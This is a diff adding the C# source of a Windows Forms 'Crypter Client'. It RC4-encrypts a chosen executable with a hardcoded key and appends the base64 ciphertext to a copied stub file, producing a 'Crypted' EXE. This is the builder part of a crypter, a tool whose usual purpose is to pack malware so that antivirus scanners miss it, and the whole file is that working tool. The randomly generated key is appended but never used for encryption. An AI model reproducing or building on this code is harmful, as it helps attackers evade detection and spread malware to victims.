@@ -1,0 +1,208 @@
+using System;
+using System.ComponentModel;
+using System.Drawing;
+using System.IO;
+using System.Text;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace Client
+{
+    public class Form1 : Form
+    {
+        private Button button1;
+        private Button button2;
+        private Button button3;
+        private Button button4;
+        private TextBox textBox1;
+        private TextBox textBox2;
+        private TextBox textBox3;
+        private OpenFileDialog openFileDialog1;
+        private OpenFileDialog openFileDialog2;
+        private SaveFileDialog saveFileDialog1;
+        private Label label1;
+
+        public Form1()
+        {
+            this.InitializeComponent();
+        }
+
+        public byte[] RC4cryptedd(byte[] input, string key)
+        {
+            byte[] bytes = Encoding.ASCII.GetBytes(key);
+            int num = 0;
+            int[] array = new int[256];
+            byte[] output = new byte[input.Length];
+
+            for (int i = 0; i < 256; i++)
+            {
+                array[i] = i;
+            }
+
+            for (int i = 0; i < 256; i++)
+            {
+                num = (num + array[i] + bytes[i % bytes.Length]) & 255;
+                int temp = array[i];
+                array[i] = array[num];
+                array[num] = temp;
+            }
+
+            int x = 0;
+            int y = 0;
+
+            for (int i = 0; i < input.Length; i++)
+            {
+                x = (x + 1) & 255;
+                y = (y + array[x]) & 255;
+                int temp = array[x];
+                array[x] = array[y];
+                array[y] = temp;
+                output[i] = (byte)(input[i] ^ array[(array[x] + array[y]) & 255]);
+            }
+
+            return output;
+        }
+
+        private static string RandomString(int length)
+        {
+            string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            Random random = new Random();
+            StringBuilder builder = new StringBuilder();
+
+            for (int i = 0; i < length; i++)
+            {
+                builder.Append(chars[random.Next(chars.Length)]);
+            }
+
+            return builder.ToString();
+        }
+
+        private void openFileDialog1_FileOk(object sender, CancelEventArgs e)
+        {
+        }
+
+        private void button1_Click_1(object sender, EventArgs e)
+        {
+            this.openFileDialog1.FileName = "";
+            this.openFileDialog1.Filter = "Executable Files |*.exe";
+            this.openFileDialog1.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+
+            if (this.openFileDialog1.ShowDialog() == DialogResult.OK)
+            {
+                this.textBox1.Text = this.openFileDialog1.FileName;
+            }
+            else
+            {
+                MessageBox.Show("Operation Cancelled", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
+            }
+        }
+
+        private void button4_Click_1(object sender, EventArgs e)
+        {
+            for (int i = 0; i < 15; i++)
+            {
+                Thread.Sleep(19);
+                Application.DoEvents();
+                this.textBox3.Text = RandomString(30);
+            }
+        }
+
+        private void button3_Click_1(object sender, EventArgs e)
+        {
+            this.saveFileDialog1.FileName = "Crypted";
+            this.saveFileDialog1.Filter = "Executable Files |*.exe";
+            this.saveFileDialog1.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+
+            if (this.saveFileDialog1.ShowDialog() == DialogResult.OK)
+            {
+                string outputFileName = this.saveFileDialog1.FileName;
+
+                if (string.IsNullOrEmpty(this.textBox1.Text) || string.IsNullOrEmpty(this.textBox2.Text))
+                {
+                    MessageBox.Show("An error occurred while encrypting!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+                else
+                {
+                    try
+                    {
+                        if (File.Exists(outputFileName))
+                        {
+                            File.SetAttributes(outputFileName, FileAttributes.Normal);
+                            File.Delete(outputFileName);
+                        }
+
+                        string inputFile = this.textBox1.Text;
+                        string stubFile = this.textBox2.Text;
+                        string randomKey = this.textBox3.Text;
+
+                        byte[] encryptedBytes = RC4cryptedd(File.ReadAllBytes(inputFile), "[~securekey~]");
+
+                        File.Copy(stubFile, outputFileName);
+                        File.AppendAllText(outputFileName, Convert.ToBase64String(encryptedBytes));
+                        File.AppendAllText(outputFileName, randomKey);
+
+                        MessageBox.Show("File successfully encrypted!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    }
+                }
+            }
+            else
+            {
+                MessageBox.Show("Operation Cancelled", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
+            }
+        }
+
+        private void InitializeComponent()
+        {
+            this.button1 = new Button();
+            this.button2 = new Button();
+            this.button3 = new Button();
+            this.button4 = new Button();
+            this.textBox1 = new TextBox();
+            this.textBox2 = new TextBox();
+            this.textBox3 = new TextBox();
+            this.openFileDialog1 = new OpenFileDialog();
+            this.openFileDialog2 = new OpenFileDialog();
+            this.saveFileDialog1 = new SaveFileDialog();
+            this.label1 = new Label();
+
+            this.SuspendLayout();
+
+            // Button1
+            this.button1.Location = new Point(244, 300);
+            this.button1.Text = "Select EXE";
+            this.button1.Click += new EventHandler(this.button1_Click_1);
+
+            // Button4
+            this.button4.Location = new Point(244, 360);
+            this.button4.Text = "Generate Key";
+            this.button4.Click += new EventHandler(this.button4_Click_1);
+
+            // Button3
+            this.button3.Location = new Point(12, 389);
+            this.button3.Text = "Encrypt";
+            this.button3.Click += new EventHandler(this.button3_Click_1);
+
+            // Form Settings
+            this.ClientSize = new Size(347, 485);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.button4);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.textBox2);
+            this.Controls.Add(this.textBox3);
+            this.Text = "Crypter Client";
+            this.ResumeLayout(false);
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+        }
+    }
+}
+
+
+
